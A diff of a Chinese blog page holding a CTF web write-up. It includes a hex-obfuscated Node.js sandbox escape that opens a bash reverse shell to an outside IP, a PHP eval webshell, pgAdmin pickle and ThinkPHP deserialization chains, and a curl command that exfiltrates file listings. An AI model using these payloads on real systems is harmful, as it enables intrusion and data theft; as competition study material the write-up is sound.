@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2024-03-25T05:25:16.000Z">
-<meta property="article:modified_time" content="2024-03-25T15:22:06.747Z">
+<meta property="article:modified_time" content="2024-03-25T15:22:43.534Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1711380126747"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1711380163534"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -210,10 +210,10 @@
 <p>爆破就能拿到，但是得找一个好点的字典，唉。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">Admin123</span><br></pre></td></tr></table></figure>
 <p><s>已将Admin123添加入我的词典，cnmd</s></p>
-<img src="/posts/undefined/23.png" class title="awa">
+<img src="/posts/40439/23.png" class title="awa">
 <p>这里爆出来Admin123</p>
 <p>进入后台随便打</p>
-<img src="/posts/undefined/24.png" class title="awa">
+<img src="/posts/40439/24.png" class title="awa">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Extensions -&gt; User Defined Tags -&gt; Edit User Defined Tag -&gt; 输入命令，submit/apply然后run即可</span><br></pre></td></tr></table></figure>
 <h1><span id="全世界最简单的ctf"> 全世界最简单的CTF</span></h1>
 <p>确实挺简单的，也很有意思。</p>
@@ -278,14 +278,14 @@
 <li>Object.values()返回对象自身的所有可枚举属性的数组</li>
 </ul>
 <p>仔细看下Buffer：</p>
-<img src="/posts/undefined/1.png" class title="awa">
+<img src="/posts/40439/1.png" class title="awa">
 <p>他在Buffer的第二个位置，也就相当于<code>Buffer[1]</code></p>
 <p>这里利用<code>Object.values(Buffer)</code></p>
 <p>反射改造一下：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="title class_">Buffer</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <p>那中间Buffer再用反射获取一下就好了：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取Buffer.from</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="variable language_">global</span>, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">startsWith</span>(<span class="string">&#x27;Buf&#x27;</span>)))),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/2.png" class title="awa">
+<img src="/posts/40439/2.png" class title="awa">
 <p>此时万事俱备</p>
 <p>payload如下：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;,&#123;<span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;<span class="keyword">const</span> q = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return global&#x27;</span></span>))();<span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(q, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(q).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;eva&#x27;</span>)))(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(q, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(q).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">startsWith</span>(<span class="string">&#x27;Buf&#x27;</span>)))),<span class="number">1</span>)(<span class="string">&#x27;70726f636573732e6d61696e4d6f64756c652e7265717569726528276368696c645f70726f6365737327292e6578656353796e63282262617368202d63202762617368202d69203e262f6465762f7463702f3130362e35322e39342e32332f3233333320303e26312722292e746f537472696e672829&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>).<span class="title function_">toString</span>());&#125;&#125;)</span><br></pre></td></tr></table></figure>
@@ -331,7 +331,7 @@
 <li>进入<code>Storage Manager</code>组件(存储管理器)</li>
 <li>上传<code>posix.pickle</code></li>
 </ul>
-<img src="/posts/undefined/22.png" class title="awa">
+<img src="/posts/40439/22.png" class title="awa">
 <ul>
 <li>改cookie，将<code>pga4_session</code>改成<code>../storage/&lt;email&gt;/posix.pickle!a，</code>其中<code>&lt;email&gt;</code>改为当前登录用户的邮箱，<code>@</code>用下划线代替</li>
 <li>其实应该是<code>/storage的路径/tacooooo_qq.com/posix.pickle</code>，pga4_session直接添加在原有的cookie里：</li>
@@ -352,14 +352,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">guest</span><br><span class="line">!@!@!@!@NKCTFChu0</span><br></pre></td></tr></table></figure>
 <p>相当于是偷步了，如果想看正解可以去看官方wp</p>
 <p>进去后垃圾箱有个shell，还原到桌面，一个<code>新建文档.html</code>，上面是</p>
-<img src="/posts/undefined/16.png" class title="awa">
+<img src="/posts/40439/16.png" class title="awa">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/data/files/shell</span><br><span class="line">&lt;?php eval($_POST[&#x27;0&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
 <p>这里太过于专注找rce洞了，没想到这个路径是能够直接访问的</p>
 <p>代审发现了一个难蚌的东西：</p>
-<img src="/posts/undefined/3.png" class title="awa">
+<img src="/posts/40439/3.png" class title="awa">
 <p>他说这里有hint…</p>
 <p>估计是想暗示我们在<code>think</code>文件夹下的问题</p>
-<img src="/posts/undefined/4.png" class title="awa">
+<img src="/posts/40439/4.png" class title="awa">
 <p>好家伙，这藏这么深。。。。</p>
 <p>这里有个反序列化的点</p>
 <p>那接下来找找有什么地方。再结合这个shell，不难想到可以想办法包含这个shell，那就是找include：</p>
@@ -371,20 +371,20 @@
 <p>反序列化找call或者destruct</p>
 </blockquote>
 <p>这里在<code>app/controller/user/think/Config.php</code>找到一个</p>
-<img src="/posts/undefined/5.png" class title="awa">
+<img src="/posts/40439/5.png" class title="awa">
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$arguments</span>[<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&#x27;.&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Error!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;./&quot;</span>.<span class="variable">$arguments</span>[<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>这里call可以包含任意文件</p>
 <p>我们先找链子，再研究thinkphp的反序列化怎么操作：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Config.php::__call</span><br></pre></td></tr></table></figure>
 <p>这边反正肯定是在这个test翻的，接下来就找什么东西能够触发call：</p>
-<img src="/posts/undefined/9.png" class title="awa">
+<img src="/posts/40439/9.png" class title="awa">
 <p>发现这个地方会调用$engine的config</p>
 <p>结束</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Config.php::__call &lt;- View.php::config()</span><br></pre></td></tr></table></figure>
 <p>这里看似可控，但是参数不对。。。</p>
 <p>看了挺多config函数，发现基本上触发不了</p>
 <p>换个地方，核心思想就是找<code>$this-&gt;a-&gt;b()</code>，触发call，而且最好是我们熟悉的魔术方法</p>
-<img src="/posts/undefined/10.png" class title="awa">
+<img src="/posts/40439/10.png" class title="awa">
 <p>这里有个get</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]-&gt;<span class="title function_ invoke__">Loginsubmit</span>(<span class="variable">$this</span>-&gt;engine);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>get这里要看data是否可控</p>
@@ -394,7 +394,7 @@
 <p>但是还是一样，搜索<code>$this-&gt;a-&gt;b</code>，慢慢找</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Config.php::__call &lt;- View.php::__get</span><br></pre></td></tr></table></figure>
 <p>审了我一年，终于找到</p>
-<img src="/posts/undefined/11.png" class title="awa">
+<img src="/posts/40439/11.png" class title="awa">
 <p><code>items-&gt;Loginout</code>，并且items可控</p>
 <p>接下来就是：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Config.php::__call &lt;- View.php::__get &lt;- Collections::toArray() &lt;-</span><br></pre></td></tr></table></figure>
@@ -402,24 +402,24 @@
 <p>这边在Collections里找到json_encode和json_serialize</p>
 <p>json_serialize没有别的类可以触发的(这边只有Collections.php和Paginator.php有，而且都是调用本类的toArray方法)</p>
 <p>那就看看encode，找toJson方法：</p>
-<img src="/posts/undefined/12.png" class title="awa">
+<img src="/posts/40439/12.png" class title="awa">
 <p>发现了本类的<code>__toString</code>调用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Config.php::__call &lt;- View.php::__get &lt;- Collection.php::toArray() &lt;- Collection.php::__toString &lt;- </span><br></pre></td></tr></table></figure>
 <p>找一个地方利用的，想起来好像什么地方有个东西直接拼接字符串的？</p>
 <p>好像是个filename的函数，搜一下</p>
 <p>果然啊，在这里</p>
-<img src="/posts/undefined/13.png" class title="awa">
+<img src="/posts/40439/13.png" class title="awa">
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;File&quot;</span>.<span class="string">&quot;<span class="subst">$filename</span>&quot;</span>.<span class="string">&quot;can&#x27;t move.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>直接拼接filename，并且files可控</p>
 <p>找一下这个removeFiles的调用</p>
-<img src="/posts/undefined/14.png" class title="awa">
+<img src="/posts/40439/14.png" class title="awa">
 <p>找到了<code>__destruct</code>，入口</p>
 <p>总结一下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Config.php::__call &lt;- View.php::__get &lt;- Collection.php::toArray() &lt;- Collection.php::__toString &lt;- Windows.php::removeFiles() &lt;- Windows.php::__destruct</span><br></pre></td></tr></table></figure>
 <p>接下来就是变量要塞啥</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Files函数肯定塞一个Collection类的对象的，这样就能够触发toString，而且是个ForEach，所以要塞数组</span><br><span class="line">仔细看Collection里直到toArray才需要items变量，所以items塞View对象</span><br><span class="line"></span><br><span class="line">view对象再看要一个data[$name]，所以data[$name]是一个Config对象，这里的$name根据上面的get传来，其实就是Loginout，data本身是个数组（</span><br><span class="line"></span><br><span class="line">最后Config对象触发的时候还要调一下engine参数，是一个数组，里面有我们需要的arguments</span><br></pre></td></tr></table></figure>
 <p>tp的php反序列化要这么写，要多加命名空间，这个namespace可以在php的定义里看见：</p>
-<img src="/posts/undefined/15.png" class title="awa">
+<img src="/posts/40439/15.png" class title="awa">
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">	<span class="title class_">class</span> <span class="title class_">Windows</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">Files</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="variable">$a</span>]; <span class="comment">//这一步将我们传入的Collection类对象变成数组形式</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Collection</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">items</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;items = <span class="variable">$a</span>;<span class="comment">//这一步将items赋值为view对象</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">View</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">data</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$engine</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">&quot;Loginout&quot;</span>=&gt;<span class="variable">$a</span>);<span class="comment">//这一步将data变成一个数组，让我们的__get方法调用到Config类的__call</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;engine = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&quot;/var/www/html/data/files/shell&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Config</span>&#123;&#125; //<span class="title class_">Config</span>啥都不用动</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">Config</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">Config</span>();</span><br><span class="line">    <span class="variable">$View</span> = <span class="keyword">new</span> think\<span class="title function_ invoke__">View</span>(<span class="variable">$Config</span>);</span><br><span class="line">    <span class="variable">$Collection</span> = <span class="keyword">new</span> think\<span class="title function_ invoke__">Collection</span>(<span class="variable">$View</span>);</span><br><span class="line">    <span class="variable">$Windows</span> = <span class="keyword">new</span> think\process\<span class="title function_ invoke__">pipes</span>(<span class="variable">$Collection</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$Windows</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>发包给password，然后post</p>
 <p>这里没回显，反弹shell测试下</p>
@@ -428,18 +428,18 @@
 <p>难蚌，debug了一下午发现少加了个windows：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">	<span class="title class_">class</span> <span class="title class_">Windows</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="variable">$a</span>]; <span class="comment">//这一步将我们传入的Collection类对象变成数组形式</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Collection</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">items</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;items = <span class="variable">$a</span>;<span class="comment">//这一步将items赋值为view对象</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">View</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">data</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$engine</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">&quot;Loginout&quot;</span>=&gt;<span class="variable">$a</span>);<span class="comment">//这一步将data变成一个数组，让我们的__get方法调用到Config类的__call</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;engine = <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&quot;data/files/shell&quot;</span>);<span class="comment">//等下给大家看看是为什么</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Config</span>&#123;&#125; //<span class="title class_">Config</span>啥都不用动</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">Config</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">Config</span>();</span><br><span class="line">    <span class="variable">$View</span> = <span class="keyword">new</span> think\<span class="title function_ invoke__">View</span>(<span class="variable">$Config</span>);</span><br><span class="line">    <span class="variable">$Collection</span> = <span class="keyword">new</span> think\<span class="title function_ invoke__">Collection</span>(<span class="variable">$View</span>);</span><br><span class="line">    <span class="variable">$Windows</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="variable">$Collection</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$Windows</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>最后一步engine那卡了挺久，这边调试了一下看看是什么情况</p>
-<img src="/posts/undefined/17.png" class title="awa">
+<img src="/posts/40439/17.png" class title="awa">
 <p>在传入<code>$arguments</code>的时候是call方法，而call方法的参数传进去默认就是一个<code>array</code>，可以给大家测试看看</p>
-<img src="/posts/undefined/18.png" class title="awa">
+<img src="/posts/40439/18.png" class title="awa">
 <p>我们确实是需要一个array，但是我们只需要一个array，call方法会再帮你加一个array，而<code>data/files/shell</code>就是为了符合include的路径</p>
 <p>发现不能够bash反弹，nc反弹</p>
 <p>这边用curl带出：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0=system(&quot;curl http://106.52.94.23:2333/`ls /|base64`&quot;);</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/19.png" class title="awa">
+<img src="/posts/40439/19.png" class title="awa">
 <p>这里由于ls的原因导致不base64会导致我们的结果只有一行</p>
-<img src="/posts/undefined/20.png" class title="awa">
+<img src="/posts/40439/20.png" class title="awa">
 <p>读到flag</p>
-<img src="/posts/undefined/21.png" class title="awa">
+<img src="/posts/40439/21.png" class title="awa">
 </div>
         </div>
         
@@ -531,7 +531,7 @@
                     <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-03-25T15:22:06.747Z" itemprop="dateModified">最后编辑：2024-03-25</time>
+                    <time datetime="2024-03-25T15:22:43.534Z" itemprop="dateModified">最后编辑：2024-03-25</time>
                 </div>
             </div>
         </footer>
